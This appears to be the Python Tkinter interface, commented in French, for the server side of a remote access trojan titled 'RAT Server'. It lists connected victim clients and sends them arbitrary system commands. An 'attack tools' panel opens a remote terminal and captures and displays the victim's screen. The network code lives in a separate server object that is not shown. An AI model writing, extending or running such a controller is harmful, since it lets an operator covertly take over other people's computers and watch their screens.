"""
Server GUI implementation.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from typing import Dict, Tuple
from src.utils.logger import Logger
from datetime import datetime
import base64
from PIL import Image, ImageTk
import io

class ServerGUI:
    """Server graphical user interface."""
    
    def __init__(self, root: tk.Tk, server):
        """
        Initialize the server GUI.
        
        Args:
            root: Tkinter root window
            server: Server instance
        """
        self.root = root
        self.server = server  # Store server reference

        # self.root.iconbitmap("chilli.ico")
        self.root.title("RAT Server")
        self.root.geometry("1200x700")  # Augmenté pour accommoder le nouveau panneau
        
        self.logger = Logger("ServerGUI")
        self.chat_loggers: Dict[int, List[str]] = {}
        
        self.clients = {}  # {client_id: (conn, addr)}
        self.selected_client = None
        self.chat_history = {}  # {client_id: [messages]}
        
        self.setup_gui()
    
    def setup_gui(self) -> None:
        """Set up the GUI components."""
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Commands tab
        commands_tab = ttk.Frame(self.notebook)
        self.notebook.add(commands_tab, text="Commandes")
        
        # Chat tab
        chat_tab = ttk.Frame(self.notebook)
        self.notebook.add(chat_tab, text="Chat")
        
        self.setup_commands_tab(commands_tab)
        self.setup_chat_tab(chat_tab)
    
    def setup_commands_tab(self, parent: ttk.Frame) -> None:
        """
        Set up the commands tab.
        
        Args:
            parent: Parent frame
        """
        # Clients list
        clients_frame = ttk.LabelFrame(parent, text="Clients connectés")
        clients_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.clients_listbox = tk.Listbox(clients_frame, height=5)
        self.clients_listbox.pack(fill=tk.X, padx=5, pady=5)
        self.clients_listbox.bind('<<ListboxSelect>>', self.on_client_select)
        
        # Command area
        command_frame = ttk.LabelFrame(parent, text="Commande système")
        command_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.command_entry = ttk.Entry(command_frame)
        self.command_entry.pack(fill=tk.X, padx=5, pady=5)
        self.command_entry.bind('<Return>', self.send_command)
        
        ttk.Button(command_frame, text="Envoyer commande", command=self.send_command).pack(pady=5)
        
        # Output area
        output_frame = ttk.LabelFrame(parent, text="Sortie")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.output_text = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD)
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.output_text.config(state=tk.DISABLED)
    
    def setup_chat_tab(self, parent: ttk.Frame) -> None:
        """
        Set up the chat tab with WhatsApp-like interface.
        
        Args:
            parent: Parent frame
        """
        # Main frame for chat
        chat_main_frame = ttk.Frame(parent)
        chat_main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Frame for client list
        clients_frame = ttk.Frame(chat_main_frame, width=200)
        clients_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 5))
        
        # Label for client list
        ttk.Label(clients_frame, text="Conversations").pack(pady=5)
        
        # Client list
        self.chat_clients_listbox = tk.Listbox(clients_frame, width=30)
        self.chat_clients_listbox.pack(fill=tk.BOTH, expand=True)
        self.chat_clients_listbox.bind('<<ListboxSelect>>', self.on_chat_client_select)
        
        # Frame for conversation
        conversation_frame = ttk.Frame(chat_main_frame)
        conversation_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Conversation header
        self.conversation_header = ttk.Label(conversation_frame, text="Sélectionnez un client pour commencer")
        self.conversation_header.pack(pady=5)
        
        # Chat area
        self.chat_text = scrolledtext.ScrolledText(conversation_frame, wrap=tk.WORD)
        self.chat_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.chat_text.config(state=tk.DISABLED)
        
        # Input frame
        input_frame = ttk.Frame(conversation_frame)
        input_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.chat_entry = ttk.Entry(input_frame)
        self.chat_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.chat_entry.bind('<Return>', self.send_chat_message)
        
        ttk.Button(input_frame, text="Envoyer", command=self.send_chat_message).pack(side=tk.RIGHT)
        
        # Frame for attack tools (right)
        tools_frame = ttk.LabelFrame(chat_main_frame, text="Outils d'attaque", width=200)
        tools_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=(5, 0))
        tools_frame.pack_propagate(False)  # Fix width
        
        # Terminal button
        terminal_btn = ttk.Button(tools_frame, text="Terminal", 
                                command=self.open_terminal)
        terminal_btn.pack(fill=tk.X, padx=5, pady=5)
        
        # Screenshot button
        screenshot_btn = ttk.Button(tools_frame, text="Screenshot", 
                                  command=self.take_screenshot)
        screenshot_btn.pack(fill=tk.X, padx=5, pady=5)
        
        # Screenshot display area
        self.screenshot_frame = ttk.LabelFrame(tools_frame, text="Screenshot")
        self.screenshot_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.screenshot_label = ttk.Label(self.screenshot_frame)
        self.screenshot_label.pack(fill=tk.BOTH, expand=True)
    
    def on_chat_client_select(self, event) -> None:
        """
        Handle chat selection.
        
        Args:
            event: Selection event
        """
        selection = self.chat_clients_listbox.curselection()
        if selection:
            client_id = int(self.chat_clients_listbox.get(selection[0]).split()[1])
            self.selected_client = client_id
            self.conversation_header.config(text=f"Conversation avec Client {client_id}")
            
            # Update chat display with history
            self.chat_text.config(state=tk.NORMAL)
            self.chat_text.delete(1.0, tk.END)
            for message in self.chat_history.get(client_id, []):
                self.chat_text.insert(tk.END, message + "\n")
            self.chat_text.see(tk.END)
            self.chat_text.config(state=tk.DISABLED)
    
    def on_client_select(self, event) -> None:
        """
        Handle client selection in commands tab.
        
        Args:
            event: Selection event
        """
        selection = self.clients_listbox.curselection()
        if selection:
            client_id = int(self.clients_listbox.get(selection[0]).split()[1])
            self.selected_client = client_id
    
    def send_command(self, event=None) -> None:
        """
        Handle command sending.
        
        Args:
            event: Optional event
        """
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("Attention", "Aucun client sélectionné")
            return
        
        command = self.command_entry.get()
        if not command:
            return
        
        self.command_entry.delete(0, tk.END)
        self.server.send_command(self.selected_client, command)
    
    def send_chat_message(self, event=None) -> None:
        """
        Handle chat message sending.
        
        Args:
            event: Optional event
        """
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("Attention", "Aucun client sélectionné")
            return
        
        message = self.chat_entry.get()
        if not message:
            return
        
        self.chat_entry.delete(0, tk.END)
        self.server.send_chat(self.selected_client, message)
    
    def add_client(self, client_id: int, address: Tuple[str, int]) -> None:
        """
        Add a client to the list.
        
        Args:
            client_id: Client ID
            address: Client address
        """
        self.clients[client_id] = (None, address)
        self.clients_listbox.insert(tk.END, f"Client {client_id} - {address[0]}:{address[1]}")
        self.chat_clients_listbox.insert(tk.END, f"Client {client_id}")
        
        # Initialize chat history for this client
        self.chat_history[client_id] = []
    
    def remove_client(self, client_id: int) -> None:
        """
        Remove a client from the list.
        
        Args:
            client_id: Client ID
        """
        # Remove from clients list
        for i in range(self.clients_listbox.size()):
            if self.clients_listbox.get(i).startswith(f"Client {client_id}"):
                self.clients_listbox.delete(i)
                break
        
        # Remove from chat clients list
        for i in range(self.chat_clients_listbox.size()):
            if self.chat_clients_listbox.get(i) == f"Client {client_id}":
                self.chat_clients_listbox.delete(i)
                break
        
        # Remove from clients dict
        if client_id in self.clients:
            del self.clients[client_id]
        
        # Remove from chat history
        if client_id in self.chat_history:
            del self.chat_history[client_id]
        
        # If this was the selected client, clear selection
        if client_id == self.selected_client:
            self.selected_client = None
            self.conversation_header.config(text="Sélectionnez un client pour commencer")
            self.chat_text.config(state=tk.NORMAL)
            self.chat_text.delete(1.0, tk.END)
            self.chat_text.config(state=tk.DISABLED)
    
    def log_message(self, message: str) -> None:
        """
        Log a message to the output area.
        
        Args:
            message: Message to log
        """
        self.output_text.config(state=tk.NORMAL)
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)
        self.output_text.config(state=tk.DISABLED)
    
    def log_chat(self, client_name: str, message: str) -> None:
        """
        Log a chat message.
        
        Args:
            client_name: Client name
            message: Message content
        """
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_message = f"[{timestamp}] {message}"
        
        # Add to chat history
        client_id = int(client_name.split()[1])
        if client_id in self.chat_history:
            self.chat_history[client_id].append(formatted_message)
        
        # Update chat display if this is the selected client
        if self.selected_client == client_id:
            self.chat_text.config(state=tk.NORMAL)
            self.chat_text.insert(tk.END, formatted_message + "\n")
            self.chat_text.see(tk.END)
            self.chat_text.config(state=tk.DISABLED)
            
            # Switch to chat tab
            self.notebook.select(1)
    
    def open_terminal(self):
        """Open terminal for the selected client."""
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("Attention", "Aucun client sélectionné")
            return
        
        # Envoyer une commande spéciale pour ouvrir le terminal
        self.server.send_command(self.selected_client, "terminal")
        self.log_message(f"[*] Terminal ouvert pour Client {self.selected_client}")
    
    def take_screenshot(self):
        """Take a screenshot from the selected client."""
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("Attention", "Aucun client sélectionné")
            return
        
        # Envoyer une commande spéciale pour prendre un screenshot
        self.server.send_command(self.selected_client, "screenshot")
        self.log_message(f"[*] Demande de screenshot envoyée au Client {self.selected_client}")
    
    def display_screenshot(self, image_data):
        """Display the received screenshot."""
        try:
            # Convertir les données base64 en image
            image_bytes = base64.b64decode(image_data)
            image = Image.open(io.BytesIO(image_bytes))
            
            # Redimensionner l'image pour l'adapter au cadre
            width = self.screenshot_frame.winfo_width() - 10
            height = self.screenshot_frame.winfo_height() - 10
            image = image.resize((width, height), Image.Resampling.LANCZOS)
            
            # Convertir en PhotoImage pour Tkinter
            photo = ImageTk.PhotoImage(image)
            
            # Mettre à jour l'image
            self.screenshot_label.configure(image=photo)
            self.screenshot_label.image = photo  # Garder une référence
            
        except Exception as e:
            self.log_message(f"[!] Erreur lors de l'affichage du screenshot: {str(e)}") 